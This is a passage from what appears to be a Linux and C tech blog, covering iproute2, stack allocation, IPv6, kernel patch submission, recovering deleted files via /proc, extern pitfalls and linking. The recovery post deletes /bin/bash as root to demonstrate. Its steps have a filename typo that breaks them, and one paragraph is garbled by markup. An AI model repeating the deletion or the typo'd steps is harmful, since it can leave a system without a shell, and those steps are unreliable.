<p>But most of normal users are not that geeky to care about millisecond speedup. They do, however, care about usability. And iproute2 does seem to have a better user interface. The ip command is better organized, in what they called objects. Links, addresses, routes, routing rules, tunnels are all objects, that can be added, deleted or listed. If a user learns how to add an address, by intuition, he can easily guess how to add a route, for example, because the syntax in similar.</p>
<p>Keyword shortening and auto completion makes the ip command more efficient by removing redundant characters. The following commands are identical as effect:</p>
<pre><code>ip address show
ip address
ip addr show
ip a s
ip a</code></pre>
<p>Some network engineers will like iproute2 because it’s similar to Cisco’s IOS: “ip route show” in Linux vs “show ip route” in IOS. Another usability feature is that you have the format for subnet masks instead of the quadded-decimal format, the first one being shorter to write and more up to date with the concept of VLSM.</p>
<p>So what does ifconfig still have to keep it around? Its biggest weakness is its biggest strength: its age. ifconfig has been out and used for so long that it’s very hard to put it away. Still many scripts in the heart of Linux distributions rely on ifconfig to work and most system administrators are used to the ifconfig command and it’s hard to move them to something new and unfamiliar. A lot of tutorials on the Internet about network configuration teach ifconfig and not iproute2 to beginners. For example, LPIC-1, one of the biggest Linux Certification out there, still requires ifconfig skills for passing the exam and barely mentiones iproute2.</p>
<p>When released, iproute2 had at least one advantage over ifconfig, and that was the feature of interacting with the IPv6 stack while ifconfig was only for IPv4. But since then, fans of ifconfig patched it so it could also be IPv6 ready.</p>
<p>But other features were not replicated. In old Linux Kernels, an interfaces could have only one IP address, so in ifconfig you could configure only one IP address on an interfaces. In newer kernels, each interface has a list of addresses and iproute2 via the NetLink interface could manage them. Latest ifconfig versions still rely on the idea of subinterfaces to provide more than one address on an interfaces.</p>
<p>So, given all these arguments, iproute2 should be declared the winner. But it’s not that easy. Just like in the case of IPv4 vs IPv6, where the latter one is the obvious choice, iproute2 will eventually replace ifconfig. Only it’s going to take a long time for that to happen, so net-tools will still be around for some time, but they will be eventually phased out.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./stack-allocation.html" title="Stack Allocation">Stack Allocation</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on December 18, 2011</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p><strong>Stack space</strong> is the part of each process’ virtual memory where function arguments and return addresses are stored, along with local variables declared within a function. Usually, the stack begins at the high address space of the virtual memory and grows down.</p>
<p>At every function call, a new <strong>stack frame</strong> is created on the stack. It contains the parameters sent to the function, the return address (the address of a code in the caller function) and the locally declared variables.</p>
<p>For each function call, the <strong>SP/ESP</strong> (Stack Pointer/Extended Stack Pointer) is set so the stack has a big enough size to accommodate local variables. For example, in theory, if you have a local char variable and an int variable, the SP should be set (moved) to 5 bytes.</p>
<p>In practice, the compiler will allocate stack space a little different than expected. It will allocate local variables space in increments of a fixed size, so sometimes having two int variables or three int variables will be the same.</p>
<p>As an example, gcc will allocate in increments of 16 bytes. Let’s make an experiment… we take a simple C program and turn into assembly code.</p>
<p>The C file looks something like this:</p>
<pre><code>int main(void)
{
	int a=1, b=2;
	return 0;
}</code></pre>
<p>The variables must be used after declaration or they will be ignored by the compiler.</p>
<p>The resulting assembly code (with an gcc -S) looks like this:</p>
<pre><code>main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$16, %esp
	movl	$1, -4(%ebp)
	movl	$2, -8(%ebp)
	movl	$0, %eax
	leave
	ret</code></pre>
<p>Notice the <em>subl</em> instruction that clears 16 bytes in the stack space by decrementing the ESP. Those 16 bytes are enough for four 32bit integers. If you have 1,2,3 or 4 local variables declared (and used), you get those 16 bytes.</p>
<p>If we declare 5 integers, the allocated space will now be 32bytes. Same thing for 6, 7, or 8. If we have 9 to 12 integers the compiler will allocate 48 bytes. An so on…</p>
<p>What if we don’t only have integers? Let’s add some chars.</p>
<pre><code>int main(void)
{
	int a=1, b=2;
	char c=3, d=4;
}</code></pre>
<p>Result:</p>
<pre><code>main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$16, %esp
	movl	$1, -8(%ebp)
	movl	$2, -12(%ebp)
	movb	$3, -1(%ebp)
	movb	$4, -2(%ebp)
	movl	$0, %eax
	leave
	ret</code></pre>
<p>The function would need 10 bytes, but still gets 16. So the allocation is in increments of 16 bytes no matter what.</p>
<p>The question remains why? It has to do with the cache alignment. The compiler will try to structure the memory usage so that the executed code can be easily fetched from memory and cached. A correct alignment will cause minimum cache misses for memory access.</p>
<p>Credits to SofiaN for help with initial observations and tests.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./the-challenges-of-ipv6.html" title="The challenges of IPv6">The challenges of IPv6</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on December  3, 2011</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>As we all know, IPv6 is the new protocol of the Internet, that will come to replace the current version of IP (Internet Protocol), IPv4. It will come to fix the flaw of the 32 bit addressing in IPv4, flaw that led to the current shortage of usable address in the Internet.</p>
<p>The addressing issue is not something new. The IETF started looking into a replacement for IPv4 since 1992-1993, when they started the IPng (IP next generation) discussion group and by 1996, they had the specifications for IPv6.</p>
<p>So considering that the Internet is about 40 years old and the IPv4 addressing problem is been known for about half that time, why is it that after 15 years since having the solution in the form of IPv6, why is it still not predominately used?</p>
<p>Probably the easiest way to have build the IPng is with a backwards compatibility (for example, using a variable length address, like OSI’s CLNP, where all the IPv4’s address space is just a part of the IPv6 space, using 32 bits). But since they wanted to start from scratch an rewrite everything in order to fix other problems in IPv4 (like the now almost useless header checksum) and to add new features (like the header extensions that allows protocols like IPSec to be built inside IPv6). But the “rewrite everything” approach meant that almost all of the components of the network layers had to be rewritten and this resulted in a large groups of people being affected by the change.</p>
<p>First were the network administrators, the ones that had to ensure that their routers, multilayer switches, firewall and wireless controllers were ready to be migrated. Most of the old equipment had to be replaced with new ones, or at least have their software updated. Current equipment do most of their packet processing in hardware to get better performance, but this is valid only for IPv4 packets. Hardware processing for IPv6 packets is something that only very new models of routers and switches do, and companies don’t really want to buy new equipment since the costs are rather big. <strong>Routing protocols</strong> had to be rewritten or modified or written from zero. OSPFv3, the link state protocol and the simple and lightweight distance vector, RIPng, had to be implemented from scratch. More modular, IP independent protocols like EIGRP and Intergrated IS-IS needed new modules for the new protocol.</p>
<p>System administrators had the same concern, getting their services IPv6 ready. From setting up their web services to listen on both protocols to the more difficult service, <strong>DNS</strong>. If DNS in IPv4 was a good thing to have, in IPv6, DNS is critical (nobody wants to remember a 32 hexadecimal digit number). The DNS protocol needed to add a new record, the AAAA record, and needed to implement a new reverse DNS zone, the ip6.arpa. zone.</p>
<p>But some of the frustrations of the administrators and the users are caused by bugs or even lack of implementation in software. Since every hardware needs a software, IPv6 first of all needs support in the software written. Kernel, system and application programmers needed starting building in support for IPv6. For example, people started patching <strong>Linux</strong> 2.1 back in 1996, but real stable, built-in support for IPv6 only came out in 2.6. Support in kernel still didn’t mean that people could use it because it lacked the userspace tools. The wide used ifconfig wasn’t build for v6, and only with the development of <strong>iproute2</strong>, Linux users could configure IPv6 on their boxes. Although considered deprecated, newer versions of ifconfig do support IPv6 address assignments. In the Windows world, things are worse, since only Windows 7 really has full support (kernel and user space tools) for IPv6.</p>
<p>Only after the IPv6 stack is built inside the kernel (the network stack being one of the hardest part of the kernel to program), the system programmers could start porting their programs to be IPv6 ready. IPv4 and IPv6 sockets are not compatible, because the second one needs to implement the address family AF_INET6. An IPv6 ready application also needs to be IPv4 working, so it needs to be smart and know when to create a v4 connection or a v6 connection. Because if only sometimes a v6 infrastructure is available, a v4 infrastructure is almost sure there. But if both are available, which one do you chose, because maybe one works better than the other in that situation?</p>
<p>So as we can see, there is not one group affected by the migration to IPv6, but rather an entire ecosystem, with several groups affecting each other.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./contributing-upstream.html" title="Contributing Upstream">Contributing Upstream</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on November 28, 2011</span>
            by
            <span class="author">Mihai</span>
            </span>

            <p>Suppose your favorite application or a library you are using has a bug. You find that the code is open source and are happy because of this. Being a programmer yourself, you know that you can fix the bug and send a patch with the fix to the maintainers. But how do you do this? This article will provide a short walkthrough for this task using as an example the Linux kernel. Different projects use different source version control systems. Because this article works on the kernel tree, I am going to use git as an example.</p>
<p>So, the first thing to do is to clone the project’s repository. This is to ensure that you are working on the latest source – maybe the bug was fixed before and your operating system’s package manager is behind on updates. For our kernel example, we will be cloning the <code>net-next</code> tree since this is where our final patch will land – from there it would be applied to the Linux kernel itself but this process is not the subject of this article.</p>
<pre><code>$ git clone
git://git.kernel.org/pub/scm/linux/kernel/git/davem/net-next.git
Cloning into 'net-next'...
remote: Counting objects: 2241130, done.
remote: Compressing objects: 100% (350702/350702), done.
remote: Total 2241130 (delta 1873243), reused 2236736 (delta 1869251)
Receiving objects: 100% (2241130/2241130), 442.07 MiB | 947 KiB/s,
done.
Resolving deltas: 100% (1873243/1873243), done.</code></pre>
<p>Next, create a new branch on which to work and checkout it. All our work will be done there and we will use this branch later when constructing the patch to be sent upstream.</p>
<pre><code>$ cd net-next/
$ git branch speedup_proc_net_dev
$ git checkout speedup_proc_net_dev
Switched to branch 'speedup_proc_net_dev'</code></pre>
<p>Now, do your work, change the source, fix the bug or develop the improvement. Be sure to follow the coding standards of the project you are contributing to. Commit often as told in the <a href="http://techblog.rosedu.org/git-good-practices.html">git</a> article. At the end of the task, when everything is solved and you are ready to submit the patch, you can rebase the commits into a single one or a set of commits depending on their content – it is better to have a single logical change per commit, also your patch will have an increased chance of being accepted if each commit is small. When rebasing your commits be sure to have a relevant commit message (as per <a href="http://techblog.rosedu.org/git-good-practices.html">git</a> article for example). For the Linux kernel there is a standard even in the commit message. Start with a single line detailing the component you’re patching and a short description of the commit then – after an empty line – write a longer message detailing what you have done. Add relevant information about the problem that you solved, and – if possible – tests made when developing your solution. Also add a <code>Signed-off-by</code> line. For example, the following is an example of a good commit message.</p>
<pre><code>    dev: use name hash for dev_seq_ops

    Instead of using the dev-&gt;next chain and trying to resync at each call to
    dev_seq_start, use the name hash, keeping the bucket and the offset in
    seq-&gt;private field.

    Tests revealed the following results for ifconfig &gt; /dev/null
	* 1000 interfaces:
		* 0.114s without patch
		* 0.089s with patch
	* 3000 interfaces:
		* 0.489s without patch
		* 0.110s with patch
	* 5000 interfaces:
		* 1.363s without patch
		* 0.250s with patch
	* 128000 interfaces (other setup):
		* ~100s without patch
		* ~30s with patch

    Signed-off-by: Mihai Maruseac &lt;mmaruseac@ixiacom.com&gt;</code></pre>
<p>Next step is to create the patch files. We do this by switching to the <code>master</code> branch and doing a <code>git format-patch</code> operation.</p>
<pre><code>$ git checkout master 
Switched to branch 'master'
$ git format-patch master..speedup_proc_net_dev 
0001-Speedup-proc-net-dev-filling.patch</code></pre>
<p>As you see, in our case a single file was created since our <code>speedup_proc_net_dev</code> branch was only a commit ahead of the <code>master</code> branch (we previously rebased everything into a single commit). This will be the file containing our patch, the file we will send upstream. But, before going there we still have a lot of things to do.</p>
<p>First of all, we will need to check our patch for coding style mistakes. In the case of the Linux kernel there is a script doing that and we will use it. For other projects, we may need to do this step manually.</p>
<pre><code>$ ./scripts/checkpatch.pl 0001-Speedup-proc-net-dev-filling.patch 
total: 0 errors, 0 warnings, 122 lines checked

0001-Speedup-proc-net-dev-filling.patch has no obvious style problems and is ready for submission.</code></pre>
<p>If there are problems we will have to go back to our branch, fix them, rebase all commits and recreate the patches with <code>git format-patch</code>. When everything is ready to be submitted we can send the patch to the developers via an email. In most projects you will simply create a bug report and attach the fix there and you are done. But since the Linux kernel is more complex we will have to use the email path presented in the following paragraphs.</p>
<p>First of all, we have to find where to send the patch. We have another script which can be used.</p>
<pre><code>$ ./scripts/get_maintainer.pl 0001-Speedup-proc-net-dev-filling.patch
&quot;David S. Miller&quot; &lt;davem@davemloft.net&gt; (maintainer:NETWORKING [GENERAL],commit_signer:118/147=80%)
Eric Dumazet &lt;eric.dumazet@gmail.com&gt; (commit_signer:32/147=22%)
&quot;Michał Mirosław&quot; &lt;mirq-linux@rere.qmqm.pl&gt; (commit_signer:21/147=14%)
Jiri Pirko &lt;jpirko@redhat.com&gt; (commit_signer:15/147=10%)
Ben Hutchings &lt;bhutchings@solarflare.com&gt; (commit_signer:9/147=6%)
netdev@vger.kernel.org (open list:NETWORKING [GENERAL])
linux-kernel@vger.kernel.org (open list)</code></pre>
<p>The addresses given as output are those where we will send our email. But, before sending the first email, we will have to configure <code>git send-email</code>. For example, adding the following lines to <code>~/.gitconfig</code> will ensure that you can use Gmail as a SMTP server for sending the patch email.</p>
<pre><code>[sendemail]
	smtpencryption = tls
	smtpserver = smtp.gmail.com
	smtpuser = yourname@gmail.com
	smtpserverport = 587</code></pre>
<p>Now, we can send the email. We will have to manually fill in the <code>--to</code> and <code>--cc</code> options or we can use a list of <code>sed</code> commands as suggested by the <a href="http://dev.chromium.org/chromium-os/how-tos-and-troubleshooting/kernel-faq#TOC-How-do-I-send-a-patch-upstream-">Chromium</a> wiki. In our case we will do it manually just to exemplify all steps, in real life it will be better to use scripts whenever it is possible.</p>
<pre><code>git send-email --to=netdev@vger.kernel.org \
&gt; --cc=linux-kernel@vger.kernel.org \
&gt; --cc=... 0001-Speedup-proc-net-dev-filling.patch
0001-Speedup-proc-net-dev-filling.patch
Who should the emails appear to be from? [Mihai Maruseac &lt;mihai.maruseac@rosedu.org&gt;] 
Emails will be sent from: Mihai Maruseac &lt;mihai.maruseac@rosedu.org&gt;
Message-ID to be used as In-Reply-To for the first email?
....</code></pre>
<p>After several more lines of output your mail will be sent. I have responded with the default entries to the above questions but the last one is very relevant, as we will see next.</p>
<p>After the mail is sent, it will appear on <a href="http://patchwork.ozlabs.org/project/netdev/list/">patchwork</a> and on the mailing lists. You will wait until someone looks through your mail and analyzes your patch. Then, the patch can be applied or someone can report some problems to you. If there are some problems, you will go back and solve them and will resend the patch using the above methodology. This time, you will answer the Message-ID question with the ID taken from the first email. In our case, the <a href="http://patchwork.ozlabs.org/patch/119174/">patch</a> was not accepted from the start and we had to reiterate. Thus, we answered that question with the ID taken from the <a href="http://patchwork.ozlabs.org/patch/119174/">initial patch</a>: <code>&lt;1318412950-22014-1-git-send-email-mmaruseac@ixiacom.com&gt;</code>. Until the <a href="http://patchwork.ozlabs.org/patch/120948/">final patch</a> was accepted I needed to send several versions.</p>
<p>Even though this lasted a whole week, the feeling I got when it was finally accepted was awesome. You will feel it too after sending the first few patches.</p>
<p>As a recommended link before the end of the article, make sure you listen the <a href="http://www.youtube.com/watch?v=LLBrBBImJt4">YouTube</a> video of Greg KH about contributing upstream.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./rescuing-executable-code-from-a-process.html" title="Rescuing executable code from a process">Rescuing executable code from a process</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on November 18, 2011</span>
            by
            <span class="author">Alexandru Juncu</span>
            </span>

            <p>A <strong>process</strong> is an instance of a binary executable file. This means that when you ‘run’ a binary, the code from the storage media is copied into the system’s memory, more precisely, into the process’ <strong>virtual memory space</strong>. From a single binary, several processes can be spawned.</p>
<p>The virtual memory of a process, made up of pages, is mapped to several things, like shared objects(libraries), shared memory, stack and heap space, read-only space and executable space. A good way to view what is mapped to what is with the <strong>pmap</strong> utility, or by just looking in the <em>/proc</em> directory hierarchy. The <em>/proc/<span class="math"><em>P</em><em>I</em><em>D</em> / <em>m</em><em>a</em><em>p</em><em>s</em><sub><em>f</em></sub><em>i</em><em>l</em><em>e</em>(<em>w</em><em>h</em><em>e</em><em>r</em><em>e</em></span>PID is the process ID of the targeted process) has the page mappings. Also in </em>/proc/$PID_, you can find other useful files, like the <em>exe</em> file that contains a symlink to the executable or the <em>fd</em> directory that contains symlinks to all the files opened as <strong>file descriptors</strong> in a process.</p>
<p>Except useful information, what can we get out of the procfs? Here is a situation that has been known to happen. You are in a console, with your bash shell, and you manage to delete some important files, like /bin/bash. Without that executable, you cannot run new shells and on a restart, your system will be inaccessible. What can you do?</p>
<p>The code of your bash is no longer on the hard drive, but it is in the virtual memory of the process you are currently running. You can find out what’s the PID of the current shell instance using *<br /><span class="math"> * <em>e</em><em>n</em><em>v</em><em>i</em><em>r</em><em>o</em><em>m</em><em>e</em><em>n</em><em>t</em><em>v</em><em>a</em><em>r</em><em>i</em><em>a</em><em>b</em><em>l</em><em>e</em>. <em>K</em><em>n</em><em>o</em><em>w</em><em>i</em><em>n</em><em>g</em><em>t</em><em>h</em><em>a</em><em>t</em>, <em>y</em><em>o</em><em>u</em><em>c</em><em>a</em><em>n</em><em>c</em><em>d</em><em>t</em><em>o</em><em>t</em><em>h</em><em>e</em><sub> / </sub><em>p</em><em>r</em><em>o</em><em>c</em> / </span><br />_ and access the content of the <em>exe</em> file there.</p>
<p>Although the exe <em>file</em> is shown as a link to the original file that is now deleted (thus the link should be broken), if you <strong>cat</strong> it, you will get its binary content. In fact, all the original binary file. Here is the step by step process:</p>
<pre><code>/bin # md5sum bash
e116963c760727bf9067e1cb96bbf7d3  bash
/bin # rm bash
/bin # echo $$
5051
/bin # cd /proc/$$
/proc/5051 # ls -la exe
lrwxrwxrwx 1 root root 0 2011-11-15 23:47 exe -&gt; /bin/bash (deleted)
/proc/5051 # cat maps
[snip]
00f9e000-00f9f000 rw-p 0001c000 08:01 263123     /lib/i386-linux-gnu/ld-2.13.so
08048000-0810c000 r-xp 00000000 08:01 284760     /bin/bash (deleted)
0810c000-0810d000 r--p 000c3000 08:01 284760     /bin/bash (deleted)
0810d000-08112000 rw-p 000c4000 08:01 284760     /bin/bash (deleted)
[snip]

/proc/5051 # cat exe&gt;/bin/bash_rescued
/proc/5051 # cd -
/bin # md5sum bash_rescued
e116963c760727bf9067e1cb96bbf7d3  bash_rescued
/bin # chmod +x bash_rescured
/bin # mv bash_rescured bash</code></pre>
<p>What other things can we rescue? How about a file that was opened by a process? For example, a video file, opened by a player:</p>
<pre><code>alexj@hathor ~ $ md5sum movie.ogv
9f701e645fd55e1ae8d35b7671002881  movie.ogv
alexj@hathor ~ $ vlc movie.ogv &amp;
[1] 6487
alexj@hathor ~ $ cd /proc/6487/fd
alexj@hathor /proc/6487/fd $ ls -la |grep movie
lr-x------ 1 alexj alexj 64 2011-11-16 00:11 23 -&gt; /home/alexj/movie.ogv
alexj@hathor /proc/6487/fd $ rm /home/alexj/movie.ogv
alexj@hathor /proc/6487/fd $ ls -la |grep movie
lr-x------ 1 alexj alexj 64 2011-11-16 00:11 23 -&gt; /home/alexj/movie.ogv (deleted)
alexj@hathor /proc/6487/fd $ cp 23 /home/alexj/movie_rescued.ogv
alexj@hathor /proc/6487/fd $ md5sum /home/alexj/movie_rescued.ogv
9f701e645fd55e1ae8d35b7671002881  /home/alexj/movie_rescued.ogv</code></pre>
<p>These things are possible because the instances of the files are still kept and used by the kernel. The <strong>VFS</strong> (the Virtual File System) still has references to the inodes of the files. They won’t be released until the processes will be finished.</p>
<p>Thanks to razvand and ddvlad for the idea of this article.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./c-extern-internals.html" title="C's extern internals">C's extern internals</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on October  9, 2011</span>
            by
            <span class="author">Daniel</span>
            </span>

            <p>The idea for this post came from <a href="http://techblog.rosedu.org/arrays-vs-pointers.html#IDComment189927033">Virgil’s</a> comment on [char[] versus char*][old-art] entry. We will dig into some of C’s extern keyword internals by means of examples and then analyze the differences between <code>extern char</code>* and <code>extern char</code>[].</p>
<p><code>extern</code> is a storage class specifier, indicating that the actual storage of a variable or the definition of a function is located elsewhere, typically in another source file.</p>
<p><img style="float:right" src="./images/c-extern-simple-usage.png" alt="C extern simple usage" width="227" height="263" /></p>
<p>Let’s start with a simple example:</p>
<p><strong>helper.c</strong></p>
<pre><code>int sample = 42; /* definition */</code></pre>
<p><strong>main.c</strong></p>
<pre><code>extern int sample; /* declaration */
int main(void)
{
	printf(&quot;sample = %d\n&quot;, sample);
}</code></pre>
<p>Having obtained the corresponding object files <code>helper.o</code> and <code>main.o</code> we link them together into an executable named <code>main</code>. We will use the <a href="http://linux.die.net/man/1/nm">nm</a> tool to check the symbols from each object file:</p>
<pre><code>$ nm helper.o
00000000 D sample
$ nm main.o
         U sample
00000000 T main</code></pre>
<p>Notice that the symbol <code>sample</code> is only declared in <code>main.c</code> but not defined there. In the linking phase, the linker searches throughout all linked object files and finds out that the actual storage for <code>sample</code> is defined in <code>helper.c</code>. As a result our <code>main</code> executable will print value <code>42</code> declared in <code>helper.c</code> external file:</p>
<pre><code>$./main
sample = 42</code></pre>
<p>Now let’s see how the compiler behaves if the types for cross-referenced variables do not match:</p>
<p><strong>foo.c</strong></p>
<pre><code>char *foo = &quot;Hello&quot;;</code></pre>
<p><strong>main.c</strong></p>
<pre><code>void foo(void);

int main(void)
{
	foo();
	return 0;
}
$ gcc -Wall -c foo.c -o foo.o
$ gcc -Wall -c main.c -o main.o
$ gcc -o main main.o foo.o
$ ./main
Segmentation fault</code></pre>
<p>Functions are by default extern, hence the declaration of symbol <code>foo</code> in <code>main.c</code> file allows the compiler to create <code>main.o</code> object file without errors or warnings. Anyhow, the linker does not check the type of symbol <code>foo</code>; thus, running the <code>main</code> executable results in a function call into an non-executable memory area.</p>
<p>Finally, let’s analyze if we can use a pointer and an array interchangeably between 2 source files.</p>
<p>First try. The file <code>main.c</code> declares an extern array of chars, leaving it to the linker to find the actual storage area defined for it. File <code>pointer.c</code> defines a pointer to a memory area holding a string literal. At link time, the symbol <code>str</code> from <code>main.c</code> is bound to a memory area representing the address of a string.</p>
<p><img style="float:right" src="./images/c-extern-char.png" alt="C extern simple usage" width="217" height="252" /></p>
<p><strong>pointer.c</strong></p>
<pre><code>char *str = &quot;1234&quot;;
char a = 'A'; /* memory guards */
char b = 'B';
char c = 'C';</code></pre>
<p><strong>main.c</strong></p>
<pre><code>extern char str[];

int main(void)
{
	printf(&quot;%s\n&quot;, str);
	return 0;
}</code></pre>
<p>By compiling and linking <code>main.c</code> and <code>pointer.c</code> together we get <code>main</code> executable.</p>
<pre><code>$ ./main
\�ABC</code></pre>
<p>Notice how the array <code>str</code> is mapped to a memory area where an address is stored. The <code>printf</code> function will display raw data until a <code>\0</code> is encountered. Fortunately, because of our guarding arrays, printing stops after showing some garbage and string <code>ABC</code>.</p>
<p>Second try. The file <code>main.c</code> declares a pointer to a memory area holding one or more characters. The linker will associate <code>str</code> from <code>main.o</code> with the storage defined by <code>str</code> array from <code>array.o</code>.</p>
<p><img style="float:right" src="./images/c-extern-pointer.png" alt="C extern simple usage" width="217" height="252" /></p>
<p><strong>array.c</strong></p>
<pre><code>char str[] = &quot;1234&quot;;</code></pre>
<p><strong>main.c</strong></p>
<pre><code>extern char *str;

int main(void)
{
	printf(&quot;%s\n&quot;, str);

	return 0;
}</code></pre>
<p>By compiling and linking together these programs we notice that running the <code>main</code> executable results in a crash.</p>
<pre><code>$ ./main
Segmentation fault</code></pre>
<p>Let’s use GDB to see the reason:</p>
<pre><code>$gdb ./main
(gdb) b main
Breakpoint 1 at 0x8048385: file main2.c, line 6.
(gdb) run
Breakpoint 1, main () at main2.c:6
6		printf(&quot;%s\n&quot;, str);
(gdb) p str
$1 = 0x34333231 Address 0x34333231 out of bounds</code></pre>
<p>One can notice that the value of the pointer <code>str</code> is the content of array <code>str</code>. This content is an invalid address dereferenced by the pointer, resulting in the delivery of the dreaded <code>SIGSEGV</code> signal.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./library-management.html" title="Linking, Loading and Library Management under Linux">Linking, Loading and Library Management under Linux</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on October  3, 2011</span>
            by
            <span class="author">Razvan</span>
            </span>

            <p>This article aims to shed some light on the topic of library management with insight on the linker and loader. The <code>ldconfig</code> command, for example, is heavily used in Linux, though unknown to some of users.</p>
<p>A library is a collection of object files “meshed” together in another file. Its benefit is avoiding “reimplementing the wheel”. Once one has implemented a given set of functionalities, he/she may store those in a library file; this file is distributed to others and used in various software projects. Libraries are heavily used in all modern operating systems; the greater part of packages in Linux distributions are library packages. One can barely imagine being able to do any kind of development without the presence of the C Standard Library on the local system.</p>
<h1 id="linking-and-loading">Linking and Loading</h1>
<p>A library is said to be “linked” together with other library files or object files into an executable. The executable integrates all required components from library files, avoiding the need of implementing these components from scratch.</p>
<p>Linking is thus the process where external references in each module (object file) are resolved; that is, undefined functions are now looked in other linked modules or library files and their code is used in the executable. The linker is the application responsible for resolving and integrating functions in the end executable file.</p>
<p>With respect to the phase when linking occurs, we differentiate between three types of linking: 1. static linking 2. load-time dynamic linking 3. run-time dynamic linking</p>
<p>The above nomenclature is specific to MSDN (<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms684184(v=vs.85).aspx" title="Load-Time Dyamic Linking">load-time dynamic linking</a> and <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms685090(v=vs.85).aspx" title="Run-Time Dynamic Linking">run-time dynamic linking</a>) but it’s a good depiction of any system using dynamic linking.</p>
<p>When using static linking, required library function code is inserted into the executable at link-time. Link-time refers to the moment when the linker process (<code>ld</code>) is invoked (typically wrapped by the <code>gcc</code> command). The result is an executable that comprises all required code to create a process.</p>
<p>When using dynamic linking, the linker process does not integrate code from the library. It simply creates stubs in the executable code stating what library file should be looked for that function. The actual “linking”, that is the “integration” of code in the executable, is done later.</p>
<p>Depending on the “later” part of dynamic linking, we differentiate between two types of linking. Load-time is when a process is created from an executable; the loader is responsible for “transforming” an executable into a process (actually, it’s not a transformation, but an instantiation). Run-time is the time while the process is running (using memory space, running code on the CPU etc.).</p>
<p>For load-time dynamic linking, the linking is done at load-time. That is, when running the executable (<code>./myexec</code>) and when the process is created, code from the library is mapped into memory and then referred to by the newly created process. For run-time dynamic linking, a specialized API allows the developer to load the library code into memory and, on demand, use specific functions.</p>
<h1 id="library-types">Library types</h1>
<p>Modern OSes such as Windows, Linux, Mac OS X and other Unices use two types of libraries, strongly related to the types of linking shown above: <em>static libraries</em> and <em>dynamic libraries</em>. Static libraries are used in conjunction with static linking, while dynamic libraries with load-time/run-time dynamic linking.</p>
<p>Static libraries use the <code>.a</code> extension on Unix and <code>.lib</code> on Windows. Each time some modules are linked against a library file, static linking is enabled and code for functions used is copied into the executable file.</p>
<pre>
    ar rc libtest.a module1.o module2.o
    gcc -o myexec exec.o -L. -l test
</pre>

<p>Dynamic libraries are called shared-object library on Unix and use the <code>.so</code> extension on Unix. On Windows, they are called dynamic-link libraries and use the <code>.dll</code> extensions. If a shared-object library is linked against a module, only references to the library are filled, no actual code is copied; that step is done later on (either at load-time or run-time).</p>
<p>In order to use a shared-object library for load-time linking, one would simply pass it as an argument to the linker:</p>
<pre>
    gcc -share -fPIC -o libtest.so module1.o module2.o
    gcc -o myexec exec.o -L. -l test
    LD_LIBRARY_PATH=. ./myexec
</pre>

<p>When the loader creates a new process (<code>LD_LIBRARY_PATH=. ./myexec</code>), the library (<code>libtest.so</code>) is mapped into memory and necessary function code is accessed.</p>
<p>The use of run-time linking requires a specialized API for loading needed function code while the process is running: <a href="http://linux.die.net/man/3/dlopen" title="dlopen(3) - Linux man page">dlopen &amp; friends</a>. A sample is shown below:</p>
<pre>
    double (*cosine)(double);

    handle = dlopen (&quot;libm.so&quot;, RTLD_LAZY);
    cosine = dlsym(handle, &quot;cos&quot;);
    printf (&quot;%f\n&quot;, (*cosine)(2.0));
</pre>

<p>Unlike static and load-time dynamic linking, run-time dynamic linking doesn’t require the presence of a library argument to the link command (that is <code>-L. -ltest</code>).</p>
<p>Advantages of a certain type of library (static or dynamic) are disadvantages for the other one and vice versa.</p>
